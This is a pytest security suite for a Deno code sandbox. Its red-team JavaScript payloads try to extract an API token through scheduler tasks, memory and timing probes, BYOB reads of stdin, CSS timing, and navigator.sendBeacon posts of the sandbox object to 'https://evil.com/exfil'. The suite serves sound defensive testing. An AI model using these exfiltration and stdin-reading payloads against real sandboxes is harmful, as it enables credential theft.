"""
Security tests for March 4, 2026 cron audit.

New attack vectors:
1. Scheduler API task priority manipulation
2. Performance memory measurement APIs
3. ReadableByteStream BYOB reader memory access
"""

import pytest
from pathlib import Path
from mistmind.sandbox import DenoSandbox

SECRET_TOKEN = "super-secret-api-token-12345"


@pytest.fixture
def deno_path():
    """Get path to Deno binary."""
    home = Path.home()
    deno_in_home = home / ".deno" / "bin" / "deno"
    
    if deno_in_home.exists():
        return str(deno_in_home)
    
    import shutil
    deno_in_path = shutil.which("deno")
    if deno_in_path:
        return deno_in_path
    
    pytest.skip("Deno not found")


@pytest.fixture
def sandbox(deno_path):
    """Create a Deno sandbox instance."""
    return DenoSandbox(deno_path=deno_path, timeout=5)


class TestMar04CronCheenuAttacks:
    """March 4, 2026 morning cron - Cheenu's red team attacks."""
    
    @pytest.mark.asyncio
    async def test_attack_scheduler_posttask_interrupt_iife(self, sandbox):
        """
        Attack: Use Scheduler.postTask() to try to interrupt IIFE execution
        
        Theory: Schedule a high-priority task that runs during IIFE token read,
        potentially accessing the token before it's hidden in closure scope.
        
        Defense: Deno doesn't support Scheduler API, or IIFE executes atomically.
        """
        code = """async () => {
            // Try to capture mist during IIFE execution via high-priority task
            let captured = null;
            
            try {
                if (typeof scheduler !== 'undefined' && scheduler.postTask) {
                    // Schedule immediate high-priority task
                    scheduler.postTask(() => {
                        try {
                            // Try to access mist during construction
                            captured = mist;
                        } catch (e) {
                            captured = {error: e.message};
                        }
                    }, {priority: 'user-blocking'});
                    
                    // Wait for task to complete
                    await new Promise(resolve => setTimeout(resolve, 100));
                    
                    if (captured) {
                        return {attack: 'Scheduler API captured mist', captured};
                    }
                }
            } catch (e) {
                // Expected: Scheduler API not available
            }
            
            return {status: 'Scheduler API not available or attack failed'};
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token=SECRET_TOKEN,
            api_host="api.mist.com",
        )
        
        # Token should NOT appear in output
        result_str = str(result)
        assert SECRET_TOKEN not in result_str, "Token leaked via Scheduler API!"
        # Verify attack failed (no captured mist object)
        if isinstance(result, dict) and "attack" in result:
            if "captured" in result:
                pytest.fail(f"Scheduler API captured mist object: {result}")
    
    @pytest.mark.asyncio
    async def test_attack_performance_memory_measurement(self, sandbox):
        """
        Attack: Use performance.measureUserAgentSpecificMemory() to probe memory layout
        
        Theory: This API (part of Performance Timeline Level 2) can measure memory
        usage of specific JavaScript contexts. Might reveal token location in memory
        or allow timing attacks based on memory allocation patterns.
        
        Defense: API not available in Deno, or returns sanitized results.
        """
        code = """async () => {
            const results = {measurements: [], timings: []};
            
            // Attempt 1: performance.measureUserAgentSpecificMemory()
            try {
                if (typeof performance !== 'undefined' && 
                    performance.measureUserAgentSpecificMemory) {
                    const memory = await performance.measureUserAgentSpecificMemory();
                    results.measurements.push({
                        type: 'measureUserAgentSpecificMemory',
                        data: memory
                    });
                }
            } catch (e) {
                results.measurements.push({error: e.message});
            }
            
            // Attempt 2: performance.memory (Chrome-specific)
            try {
                if (typeof performance !== 'undefined' && performance.memory) {
                    results.measurements.push({
                        type: 'performance.memory',
                        usedJSHeapSize: performance.memory.usedJSHeapSize,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
                    });
                }
            } catch (e) {
                results.measurements.push({error: e.message});
            }
            
            // Attempt 3: Timing attack on mist.request allocation
            try {
                const start = performance.now();
                // Force allocation
                const request = mist.request;
                const end = performance.now();
                
                results.timings.push({
                    type: 'mist_allocation_time',
                    duration: end - start
                });
            } catch (e) {
                results.timings.push({error: e.message});
            }
            
            // Try to probe memory via ArrayBuffer allocation patterns
            try {
                const buffers = [];
                const start = performance.now();
                
                // Allocate memory to see if token affects heap
                for (let i = 0; i < 100; i++) {
                    buffers.push(new ArrayBuffer(1024));
                }
                
                const end = performance.now();
                results.timings.push({
                    type: 'heap_allocation_pattern',
                    duration: end - start
                });
            } catch (e) {
                results.timings.push({error: e.message});
            }
            
            return results;
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token=SECRET_TOKEN,
            api_host="api.mist.com",
        )
        
        # Token should NOT appear in output
        result_str = str(result)
        assert SECRET_TOKEN not in result_str, "Token leaked via memory measurement!"
        assert "[REDACTED]" in result_str or "usedJSHeapSize" not in result_str
        
        # Should not reveal sensitive memory information
        if "usedJSHeapSize" in result_str:
            pytest.fail("Performance.memory API exposed - potential memory probing attack")
    
    @pytest.mark.asyncio
    async def test_attack_readable_bytestream_byob_reader(self, sandbox):
        """
        Attack: Use ReadableStream BYOB (Bring Your Own Buffer) reader to access token
        
        Theory: BYOB readers allow direct access to underlying buffer memory.
        If the token passes through a ReadableStream (e.g., during stdin read),
        a BYOB reader might access the raw buffer containing the token.
        
        Defense: Token is read before user code executes, no access to stdin stream.
        """
        code = """async () => {
            const attacks = [];
            
            // Attempt 1: Try to access Deno.stdin as BYOB readable stream
            try {
                if (typeof Deno !== 'undefined' && Deno.stdin) {
                    const reader = Deno.stdin.readable.getReader({mode: 'byob'});
                    const buffer = new Uint8Array(1024);
                    const {value, done} = await reader.read(buffer);
                    
                    if (value && value.length > 0) {
                        const text = new TextDecoder().decode(value);
                        attacks.push({
                            type: 'byob_stdin_read',
                            leaked: text
                        });
                    }
                    reader.releaseLock();
                }
            } catch (e) {
                attacks.push({type: 'byob_stdin_read', error: e.message});
            }
            
            // Attempt 2: Create a response with BYOB reader to inspect headers
            try {
                const mockResponse = await mist.request({
                    path: '/api/v1/self'
                });
                
                // Try to reconstruct the request that was made
                // by creating a BYOB stream from the response
                if (mockResponse && typeof mockResponse === 'object') {
                    attacks.push({
                        type: 'response_inspection',
                        keys: Object.keys(mockResponse)
                    });
                }
            } catch (e) {
                attacks.push({type: 'response_inspection', error: e.message});
            }
            
            // Attempt 3: SharedArrayBuffer + BYOB to share memory across contexts
            try {
                const sab = new SharedArrayBuffer(1024);
                const view = new Uint8Array(sab);
                
                // Try to read from stdin into shared buffer
                if (typeof Deno !== 'undefined' && Deno.stdin) {
                    const reader = Deno.stdin.readable.getReader({mode: 'byob'});
                    await reader.read(view);
                    reader.releaseLock();
                    
                    const leaked = new TextDecoder().decode(view);
                    if (leaked.length > 0) {
                        attacks.push({
                            type: 'shared_buffer_leak',
                            leaked: leaked
                        });
                    }
                }
            } catch (e) {
                attacks.push({type: 'shared_buffer_leak', error: e.message});
            }
            
            return {attacks};
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token=SECRET_TOKEN,
            api_host="api.mist.com",
        )
        
        # Token should NOT appear in output
        result_str = str(result)
        assert SECRET_TOKEN not in result_str, "Token leaked via BYOB reader!"
        assert "[REDACTED]" in result_str or "leaked" not in result.get("attacks", [{}])[0]
        
        # Verify stdin is not accessible
        if isinstance(result, dict) and "attacks" in result:
            for attack in result["attacks"]:
                if "leaked" in attack and attack.get("leaked"):
                    pytest.fail(f"BYOB reader accessed stdin: {attack}")


class TestNavigatorAPIExfiltration:
    """Test attacks using Navigator APIs for data exfiltration."""
    
    @pytest.mark.asyncio
    async def test_attack_navigator_sendbeacon_exfiltration(self, sandbox):
        """
        Attack: Use navigator.sendBeacon() to exfiltrate token to attacker server
        
        Theory: sendBeacon() can send data to arbitrary URLs, potentially bypassing
        the Deno network allowlist by using blob: or data: URLs, or by sending
        to an unauthorized host before the request is blocked.
        
        Defense: Deno network permissions block unauthorized hosts, or Navigator
        API is not available in Deno.
        """
        code = """async () => {
            const attempts = [];
            
            // Attempt 1: navigator.sendBeacon to attacker URL
            try {
                if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
                    const success = navigator.sendBeacon(
                        'https://evil.com/exfil',
                        'token=' + 'attempt_to_leak'
                    );
                    attempts.push({
                        type: 'sendBeacon_https',
                        success: success
                    });
                }
            } catch (e) {
                attempts.push({type: 'sendBeacon_https', error: e.message});
            }
            
            // Attempt 2: sendBeacon with Blob containing token reference
            try {
                if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
                    const blob = new Blob(
                        [JSON.stringify({mist: mist.toString()})],
                        {type: 'application/json'}
                    );
                    const success = navigator.sendBeacon('https://evil.com/exfil', blob);
                    attempts.push({
                        type: 'sendBeacon_blob',
                        success: success
                    });
                }
            } catch (e) {
                attempts.push({type: 'sendBeacon_blob', error: e.message});
            }
            
            return {attempts};
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token=SECRET_TOKEN,
            api_host="api.mist.com",
        )
        
        # Token should NOT appear in output
        result_str = str(result)
        assert SECRET_TOKEN not in result_str, "Token leaked via sendBeacon!"
        
        # sendBeacon should either fail or not be available
        if isinstance(result, dict) and "attempts" in result:
            for attempt in result["attempts"]:
                if attempt.get("success") is True:
                    pytest.fail(f"sendBeacon succeeded to unauthorized host: {attempt}")


class TestCSSAPITimingSideChannel:
    """Test timing side channels via CSS APIs."""
    
    @pytest.mark.asyncio
    async def test_attack_css_supports_timing_oracle(self, sandbox):
        """
        Attack: Use CSS.supports() timing differences to infer token characteristics
        
        Theory: CSS.supports() evaluation time might vary based on token length
        or contents if the token is somehow reflected in CSS context, or if
        we can use CSS property values to create a timing oracle.
        
        Defense: CSS API not available in Deno, or timing is constant.
        """
        code = """async () => {
            const timings = [];
            
            try {
                if (typeof CSS !== 'undefined' && CSS.supports) {
                    // Test various CSS properties with different complexities
                    const properties = [
                        'color: red',
                        'background: linear-gradient(45deg, red, blue)',
                        'transform: matrix3d(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1)',
                        'filter: blur(10px) contrast(200%) brightness(150%)'
                    ];
                    
                    for (const prop of properties) {
                        const start = performance.now();
                        for (let i = 0; i < 1000; i++) {
                            CSS.supports(prop);
                        }
                        const end = performance.now();
                        timings.push({
                            property: prop,
                            duration: end - start
                        });
                    }
                    
                    // Try to correlate timing with mist object access
                    const start = performance.now();
                    const mistStr = mist.toString();
                    const end = performance.now();
                    timings.push({
                        type: 'mist_toString_timing',
                        duration: end - start
                    });
                }
            } catch (e) {
                timings.push({error: e.message});
            }
            
            return {timings};
        }"""
        
        result = await sandbox.run_execute(
            code=code,
            api_token=SECRET_TOKEN,
            api_host="api.mist.com",
        )
        
        # Token should NOT appear in output
        result_str = str(result)
        assert SECRET_TOKEN not in result_str, "Token leaked via CSS API!"
        
        # CSS API should not be available in Deno
        if isinstance(result, dict) and "timings" in result:
            css_timings = [t for t in result["timings"] if "property" in t]
            if css_timings:
                pytest.fail("CSS.supports() is available - potential timing side channel")
